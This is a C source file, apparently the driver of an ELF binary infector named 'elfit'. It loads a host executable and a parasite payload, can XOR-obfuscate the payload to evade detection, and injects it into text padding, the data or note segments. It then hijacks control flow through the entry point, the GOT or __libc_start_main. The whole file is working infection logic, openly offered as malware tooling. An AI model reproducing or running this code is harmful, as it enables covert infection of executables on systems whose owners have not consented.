#include <elfit.h>


int elfit32(opts_t *opts)
{
    Elfit_t host;
    Elfit_t parasite;
    uint32_t malpoint;
    uint32_t patch_pos;
    uint32_t patch_addr;
    off_t patch_off;

    /*
    if (opts->cross_infect)
    {
        opts->cross_infect--;
        return elfit32(opts);
    }
    */

    malpoint = 0;
    if (!opts->host)
    {
        return -1;
    }

    patch_pos = opts->patch_pos;
    
    load_host(opts->host, &host);
    load_host(opts->parasite, &parasite);

    patch_addr = opts->patch_addr;
    if (!patch_addr)
    {
        switch(opts->redirection_method)
        {
            case ENTRY_REDIR:
                printf("[+ ENTRYPOINT REDIR]\n");
                patch_off = entry_redirect_32(&host, &patch_addr);
                break;
            case GOT_REDIR:
                printf("[+ GOT REDIR]\n");
                patch_off = got_redirect_32(&host, opts->pltsymbol, &patch_addr);
                break;
            case CTORS_REDIR:
                printf("[+ CTORS REDIR]\n");
                printf("unimplemented redirection method chosen\n");
                exit(1);
            case DTORS_REDIR:
                printf("[+ DTORS REDIR]\n");
                printf("unimplemented redirection method chosen\n");
                exit(1);
            case ARBFUNC_REDIR:
                printf("[+ ARBFUNC REDIR]\n");
                printf("unimplemented redirection method chosen\n");
                exit(1);
            case STARTMAIN_REDIR:
                printf("[+ LIBC_START_MAIN REDIR]\n");
                patch_off = libc_start_main_hijack_32(&host, opts->startmain_mode, &patch_addr);
                break;
            default:
                printf("[-] no redirection method chosen\n");
                printf("continuing infection process\n");
                patch_off = -1;
         }
    }

    printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", patch_addr);
    if (patch_parasite32(&parasite, patch_pos, patch_addr))
    {
        printf("out-of-bounds patch position supplied\n");
    }

    if (opts->polymorphic_key)
    {
        printf("[+ POLYMORPHIZING PARASITE]\twith xor key 0x%0x\n", opts->polymorphic_key);
        parasite_polymorphize32(&parasite, opts->polymorphic_key);
    }

    /* If we're injecting to the text segment and we're using polymorphism
     * we must make the text segment writable */

    switch(opts->injection_method)
    {
        case TEXT_INJECT:
            printf("[+ INJECTING PARASITE TO TEXT]\n");
            malpoint = textpadding_inject_32(&host, &parasite, 
                patch_pos, opts->patch_addr);
            reload_host(opts->host, &host);
            if(opts->polymorphic_key)
            {
                printf("[+ TEXT_SEGMENT MOD]\t\tmaking text segment writable for polymorphism\n");
                make_text_writeable32(&host);
            }
            break;
        case REVERSE_INJECT:
            printf("[+ INJECTING PARASITE TO TEXT BOTTOM]\n");
            malpoint = reverse_inject_32(&host, &parasite);
            reload_host(opts->host, &host);
            if(opts->polymorphic_key)
                make_text_writeable32(&host);
            break;
        case DATA_INJECT:
            printf("[+ INJECTING PARASITE INTO DATA SEGMENT]\n");
            printf("chosen injection method not yet implemented\n");
            exit(1);
        case SO_INJECT:
            printf("[+ CREATING DEPENDENCY TO MALICIOUS LIBRARY]\n");
            printf("chosen injection method not yet implemented\n");
            exit(1);
        case ETREL_INJECT:
            printf("[+ INJECTING RELOCATABLE]\n");
            printf("chosen injection method not yet implemented\n");
            exit(1);
        case NOTE_INJECT:
            printf("[+ INJECTING NOTE]\n");
            malpoint = note_inject_32(&host, &parasite);
            reload_host(opts->host, &host);
            if(opts->polymorphic_key)
            {
                printf("Polymorphic parasite not impolemented for note injection\n");
                exit(1);
            }
            break;
    }

    printf("[+] Parasite at 0x%lx-0x%lx\n", malpoint, malpoint + parasite.file->st_size);

    reload_host(opts->host, &host);

    /* this is hacky, but we have to get the patch offset again 
     * after injection. things may have moved around */
    if (opts->redirection_method == GOT_REDIR)
        patch_off = got_redirect_32(&host, opts->pltsymbol, &patch_addr);
    if (opts->redirection_method == STARTMAIN_REDIR)
        patch_off = libc_start_main_hijack_32(&host, opts->startmain_mode, &patch_addr);

    if (patch_off != -1) {
      printf("[+ APPLYING REDIRECTION]\n");
      commit_redirect_32(&host, patch_off, malpoint);
    }

    unload_host(&host);
    return 1;
}

int elfit64(opts_t *opts)
{
    Elfit_t host;
    Elfit_t parasite;
    uint64_t malpoint;
    uint64_t patch_pos;
    uint64_t patch_addr;
    off_t patch_off;

    /*
    if (opts->cross_infect)
    {
        opts->cross_infect--;
        return elfit32(opts);
    }
    */

    if (!opts->host)
    {
        return -1;
    }

    patch_pos = opts->patch_pos;
    
    load_host(opts->host, &host);

    if (opts->parasite)
        load_host(opts->parasite, &parasite);

    patch_addr = opts->patch_addr;
    if (!patch_addr)
    {
        switch(opts->redirection_method)
        {
            case ENTRY_REDIR:
                printf("[+ ENTRYPOINT REDIR]\n");
                patch_off = entry_redirect_64(&host, &patch_addr);
                break;
            case GOT_REDIR:
                printf("[+ GOT REDIR]\n");
                patch_off = got_redirect_64(&host, opts->pltsymbol, &patch_addr);
                break;
            case CTORS_REDIR:
                printf("[+ CTORS REDIR]\n");
                printf("unimplemented redirection method chosen\n");
                exit(1);
            case DTORS_REDIR:
                printf("[+ DTORS REDIR]\n");
                printf("unimplemented redirection method chosen\n");
                exit(1);
            case ARBFUNC_REDIR:
                printf("[+ ARBFUNC REDIR]\n");
                printf("unimplemented redirection method chosen\n");
                exit(1);
            case STARTMAIN_REDIR:
                printf("[+ LIBC_START_MAIN REDIR]\n");
                patch_off = libc_start_main_hijack_64(&host, opts->startmain_mode, &patch_addr);
                break;
            default:
                printf("[-] no redirection method chosen\n");
                printf("continuing infection process\n");
                patch_off = -1;
         }
    }

    printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", patch_addr);
    if (opts->parasite)
        if (patch_parasite64(&parasite, patch_pos, patch_addr))
        {
            printf("out-of-bounds patch position supplied\n");
        }

    if (opts->polymorphic_key)
    {
        printf("[+ POLYMORPHIZING PARASITE]\twith xor key 0x%0x\n", opts->polymorphic_key);
        parasite_polymorphize64(&parasite, opts->polymorphic_key);
    }

    /* If we're injecting to the text segment and we're using polymorphism
     * we must make the text segment writable */

    switch(opts->injection_method)
    {
        case TEXT_INJECT:
            printf("[+ INJECTING PARASITE TO TEXT]\n");
            malpoint = textpadding_inject_64(&host, &parasite, 
                patch_pos, opts->patch_addr);
            reload_host(opts->host, &host);
            if(opts->polymorphic_key)
            {
                printf("[+ TEXT_SEGMENT MOD]\t\tmaking text segment writable for polymorphism\n");
                make_text_writeable64(&host);
            }
            break;
        case REVERSE_INJECT:
            printf("[+ INJECTING PARASITE TO TEXT BOTTOM]\n");
            malpoint = reverse_inject_64(&host, &parasite);
            printf("[+ INJECTED AT %08x]\n", malpoint);
            reload_host(opts->host, &host);
            if(opts->polymorphic_key)
                make_text_writeable64(&host);
            break;
        case DATA_INJECT:
            printf("[+ INJECTION PARASITE INTO DATA SEGMENT]\n");
            malpoint = data_inject_64(&host, &parasite);
            reload_host(opts->host, &host);

            /* since this is 64 bit we have to make the segment executable */
            make_data_executable64(&host); 
            break;
        case SO_INJECT:
            printf("[+ CREATING DEPENDENCY TO MALICIOUS LIBRARY]\n");
            printf("chosen injection method not yet implemented\n");
            exit(1);
        case ETREL_INJECT:
            printf("[+ INJECTING RELOCATABLE]\n");
            printf("chosen injection method not yet implemented\n");
            exit(1);
        case NOTE_INJECT:
            printf("[+ INJECTING NOTE]\n");
            malpoint = note_inject_64(&host, &parasite);
            reload_host(opts->host, &host);
            if(opts->polymorphic_key)
            {
                printf("Polymorphic parasite not impolemented for note injection\n");
                exit(1);
            }
            break;
        default:
            printf("[-] no injection technique chosen\n");
    }

    printf("[+] Parasite at 0x%lx-0x%lx\n", malpoint, malpoint + parasite.file->st_size);

    reload_host(opts->host, &host);

    /* this is hacky, but we have to get the patch offset again 
     * after injection. things may have moved around */
    if (opts->redirection_method == GOT_REDIR)
        patch_off = got_redirect_64(&host, opts->pltsymbol, &patch_addr);
    if (opts->redirection_method == STARTMAIN_REDIR)
        patch_off = libc_start_main_hijack_64(&host, opts->startmain_mode, &patch_addr);

    if (patch_off != -1) {
      printf("[+ APPLYING REDIRECTION]\n");
      commit_redirect_64(&host, patch_off, malpoint);
    }

    unload_host(&host);
    return 1;
}

int get_elf_class(char *filename)
{
    if (!filename)
    {
        return -1;
    }

    // read elf class
    char header[5];
    FILE *in = fopen(filename, "rb");
    int num_bytes = fread(header, 1, 5, in);
    fclose(in);

    // return the elf class
    if (num_bytes < 5)
    {
        return -1;
    }

    return (int) header[4];

}

int main(int argc, char *argv[])
{
    opts_t *opts;

    if ((opts = usage(argc, argv)) == NULL)
    {
        exit(-1);
    }
    /* TODO Integrity check host for section header table */
    int elf_class = get_elf_class(opts->host);
    if (elf_class == ELF_CLASS_32)
    {
        return elfit32(opts);
    }
    else if (elf_class == ELF_CLASS_64)
    {
        return elfit64(opts);
    }
    else
    {
        printf("Unkown elf class: %d\n", elf_class);
        return -1;
    }
}
